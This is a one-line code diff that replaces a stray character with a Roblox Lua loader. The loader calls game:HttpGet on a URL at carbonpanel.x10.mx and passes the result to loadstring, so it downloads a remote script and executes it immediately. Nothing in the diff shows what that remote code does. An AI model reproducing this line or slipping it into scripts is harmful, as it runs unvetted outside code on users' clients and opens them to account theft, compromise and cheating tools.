@@ -1,1 +1,1 @@
-w
+loadstring(game:HttpGet("https://carbonpanel.x10.mx/api/loader.php?script=60"))()
